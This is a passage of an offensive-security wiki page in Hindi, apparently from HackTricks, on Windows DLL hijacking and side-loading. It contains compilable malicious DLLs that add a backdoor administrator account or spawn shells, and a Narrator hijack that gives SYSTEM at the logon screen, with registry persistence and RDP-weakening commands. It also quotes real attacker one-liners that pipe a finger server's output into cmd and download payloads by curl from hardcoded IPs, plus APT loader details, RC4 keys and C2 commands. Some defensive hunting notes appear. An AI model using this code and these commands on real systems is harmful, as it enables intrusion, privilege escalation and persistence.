// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>user creation के साथ C++ DLL उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>thread entry वाला वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी start होने पर एक predictable, language-specific localization DLL को probe करता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- अगर OneCore path पर attacker-controlled writable DLL मौजूद हो, तो वह load होती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं है।

Procmon से discovery
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator start करें और ऊपर दिए गए path को load करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC में चुप्पी
- एक naive hijack बोलता है या UI को highlight करता है। शांत रहने के लिए, attach होने पर Narrator threads enumerate करें, मुख्य thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपना काम अपने thread में जारी रखें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के ज़रिए Trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए तरीकों से, Narrator शुरू करने पर planted DLL load होता है। Secure desktop (logon screen) पर CTRL+WIN+ENTER दबाकर Narrator शुरू करें; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।

RDP से शुरू होने वाला SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host से RDP करें और logon screen पर CTRL+WIN+ENTER दबाकर Narrator launch करें; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।
- RDP session बंद होने पर execution रुक जाता है—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) clone कर सकते हैं, उसे किसी मनमाने binary/DLL की ओर point करने के लिए edit कर सकते हैं, उसे import कर सकते हैं, फिर `configuration` को उस AT name पर set कर सकते हैं। इससे Accessibility framework के तहत मनमाना execution proxy होता है।

नोट्स
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights आवश्यक हैं।
- Payload का पूरा logic `DLL_PROCESS_ATTACH` में हो सकता है; किसी export की ज़रूरत नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation

यह case Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है, जिसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability का विवरण

- **Component**: `TPQMAssistant.exe`, जो `C:\ProgramData\Lenovo\TPQM\Assistant\` में स्थित है।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ सुबह 9:30 बजे logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` के लिए writable, जिससे local users मनमानी files डाल सकते हैं।
- **DLL Search Behavior**: पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और DLL न मिलने पर "NAME NOT FOUND" log करता है, जो local directory को पहले search किए जाने का संकेत है।

### Exploit का कार्यान्वयन

Attacker उसी directory में एक malicious `hostfxr.dll` stub रखकर missing DLL का फायदा उठा सकता है और user के context में code execution हासिल कर सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### अटैक फ़्लो

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. वर्तमान user के context में सुबह 9:30 बजे scheduled task चलने तक प्रतीक्षा करें।
3. यदि task के execute होने पर कोई administrator लॉग इन हो, तो malicious DLL administrator के session में medium integrity पर चलती है।
4. medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques को chain करें।

## केस स्टडी: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) के ज़रिए DLL Side-Loading

Threat actors अक्सर trusted, signed process के तहत payloads execute करने के लिए MSI-based droppers को DLL side-loading के साथ जोड़ते हैं।<sup>[[10]](#references)</sup>

Chain का अवलोकन
- User MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (जैसे, LaunchApplication या VBScript action), जो embedded resources से next stage को reconstruct करता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को एक ही directory में लिखता है (उदाहरण pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order पहले working directory से wsc.dll load करता है, जिससे signed parent के तहत attacker code execute होता है (ATT&CK T1574.001)।

MSI analysis (किन चीज़ों पर ध्यान दें)
- CustomAction table:
  - ऐसी entries देखें जो executables या VBScript चलाती हों। संदिग्ध pattern का उदाहरण: LaunchApplication का background में embedded file execute करना।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables देखें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi इस्तेमाल करें: lessmsi x package.msi C:\out
  - कई छोटे fragments देखें, जिन्हें VBScript CustomAction जोड़कर और decrypt करके इस्तेमाल करता है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- इन दो फ़ाइलों को एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध signed host (Avast)। यह process अपने directory से नाम के आधार पर wsc.dll लोड करने का प्रयास करता है।
  - wsc.dll: attacker DLL। यदि किसी विशिष्ट exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और DllMain में payload चलाते हुए आवश्यक exports को genuine library तक forward करें।
- एक minimal DLL payload बनाएं:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, एक proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके ऐसी forwarding DLL generate करें जो आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन बातों पर विचार करें।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon, disk पर core payload को encrypted रखते हुए legitimate software में घुलने-मिलने के लिए **three-file triad** का उपयोग करके ShadowPad deploy करता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature valid रहता है।
2. **Malicious loader DLL** – इसे EXE के बगल में अपेक्षित नाम (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) के साथ रखा जाता है। यह DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob ढूँढ़ना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – इसे अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence नष्ट करने के लिए TMP file हटा देता है।

Tradecraft संबंधी बातें:

* Signed EXE का नाम बदलने पर (PE header में मूल `OriginalFileName` बनाए रखते हुए) वह Windows binary का रूप ले सकता है, जबकि vendor signature बरकरार रहता है। इसलिए Ink Dragon की उस आदत को अपनाएँ जिसमें `conhost.exe` जैसी दिखने वाली binaries डाली जाती हैं, जो असल में AMD/NVIDIA utilities होती हैं।
* चूँकि executable trusted बना रहता है, अधिकांश allowlisting controls के लिए बस इतना ज़रूरी है कि आपकी malicious DLL उसके साथ रखी हो। Loader DLL को customize करने पर ध्यान दें; signed parent आमतौर पर बिना बदलाव के चल सकता है।
* ShadowPad के decryptor को TMP blob, loader के बगल में और writable स्थिति में चाहिए, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory writable रखें; memory में आने के बाद OPSEC के लिए TMP file सुरक्षित रूप से हटाई जा सकती है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, DLL sideloading को LOLBAS के साथ जोड़ते हैं, ताकि disk पर एकमात्र custom artifact trusted EXE के बगल में रखी malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` चलाता है, Finger server से commands लाता है और उन्हें `cmd` तक pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 से text लेता है; `| cmd` server के response को execute करता है, जिससे operators server-side पर second stage को बदल सकते हैं।

- **Built-in download/extract:** Benign extension वाली archive download करें, उसे unpack करें और sideload target तथा DLL को किसी random `%LocalAppData%` folder में stage करें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress छिपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के ज़रिए शुरू करें, ताकि telemetry में colocated DLL लोड करते समय CIM-created process दिखाई दे:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted name के तहत चलता है।

- **Hunting:** जब `forfiles` में `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो alert करें; admin scripts के बाहर यह असामान्य है।


## केस स्टडी: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल ही में Lotus Blossom intrusion ने एक trusted update chain का दुरुपयोग करके NSIS-packed dropper पहुँचाया, जिसने DLL sideload और पूरी तरह in-memory payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft प्रवाह
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** चिह्नित करता है, Bitdefender Submission Wizard का बदला हुआ नाम वाला `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` वहाँ डालता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` को call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से derived), buffer को plaintext shellcode से overwrite करता है, temporary data free करता है और उस पर jump करता है।
- IAT से बचने के लिए, loader **FNV-1a basis 0x811C9DC5 + prime 0x1000193** का उपयोग करके export names को hash करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना करता है।

Main shellcode (Chrysalis)
- पाँच passes में key `gQ2JR&9;` के साथ add/XOR/sub दोहराकर PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- Runtime में per-character bit-rotate/XOR transforms के ज़रिए DLL name strings फिर से बनाता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- एक second resolver इस्तेमाल करता है, जो **PEB → InMemoryOrderModuleList** को traverse करता है, हर export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है, और hash न मिलने पर ही `GetProcAddress` का fallback इस्तेमाल करता है।

Embedded configuration और C2
- Config, dropped `BluetoothService` file में **offset 0x30808** पर रहती है (size **0x980**) और key `qwhvb^435h&*7` से RC4-decrypt होती है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, `4Q` tag जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses RC4-decrypt होते हैं और tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) के ज़रिए dispatch होते हैं।
- Execution mode CLI args से नियंत्रित होता है: बिना args = `-i` की ओर इशारा करने वाली persistence (service/Run key) install करें; `-i` self को `-k` के साथ relaunch करता है; `-k` install छोड़कर payload चलाता है।

देखा गया वैकल्पिक loader
- इसी intrusion ने Tiny C Compiler भी drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया, जिसके बगल में `libtcc.dll` था। Attacker द्वारा दिए गए C source में shellcode embedded था; उसे compile करके memory में चलाया गया, बिना PE को disk पर लिखे। इसे इस तरह replicate करें:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-आधारित compile-and-run चरण ने runtime पर `Wininet.dll` import किया और hardcoded URL से दूसरे चरण का shellcode प्राप्त किया, जिससे एक लचीला loader मिला जो compiler run का रूप धारण करता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को बिना crash हुए ठीक से load करने तक चलता रहे।<sup>[[11]](#references)</sup>

देखा गया pattern
- अपेक्षित dependency नाम, जैसे `version.dll`, का उपयोग करके किसी trusted EXE को malicious DLL के साथ रखें।
- Malicious DLL सभी अपेक्षित exports को **proxy** करके असली system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) तक पहुँचाता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL host entry point को **patch** करता है, ताकि main thread बाहर निकलने या process को समाप्त करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: अगले चरण के DLL नाम या path को decrypt करना (RC4/XOR आम हैं), फिर `LoadLibrary` से उसे launch करना।

यह क्यों मायने रखता है
- सामान्य DLL proxying API compatibility बनाए रखता है, लेकिन यह सुनिश्चित नहीं करता कि host बाद के stages के लिए पर्याप्त समय तक चलता रहे।
- Main thread को `Sleep(INFINITE)` में रोकना, loader द्वारा worker thread में decryption, staging या network bootstrap किए जाने तक signed process को resident रखने का सरल तरीका है।
- केवल संदिग्ध `DllMain` की तलाश करने पर यह pattern छूट सकता है, यदि असली गतिविधि host entry point को patch करने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE को copy करें और पता लगाएँ कि वह local directory से कौन-सी DLL resolve करता है।
2. उन्हीं functions को export करने वाली proxy DLL बनाएँ और उन्हें legitimate DLL तक forward करें।
3. `DllMain(DLL_PROCESS_ATTACH)` में एक worker thread बनाएँ।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` पर loop करे।
5. अगले चरण के DLL नाम/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

रक्षात्मक जाँच-बिंदु
- ऐसे signed processes जो `version.dll` या इसी तरह की आम libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load होने के तुरंत बाद process entry point पर memory patches, खासकर ऐसे jumps/calls जो `Sleep`/`SleepEx` पर redirect होते हैं।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो तुरंत decrypted नाम वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- Writable staging directories, जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के साथ रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking। सरल C उदाहरण।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ने Europe को निशाना बनाते हुए नया Malware तैनात किया](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks का सामना Windows Helpers से होता है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले विकसित होते Impersonation Campaigns का विश्लेषण](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – परस्पर मिलते हित: Southeast Asian Government को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon के भीतर: Stealthy Offensive Operation के Relay Network और आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit का विस्तृत विश्लेषण](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens के 2026 Espionage Campaigns पर नज़र](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – तेज़ और उग्र: Iranian Conflict के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ने Southeast Asian Governments और Critical Infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
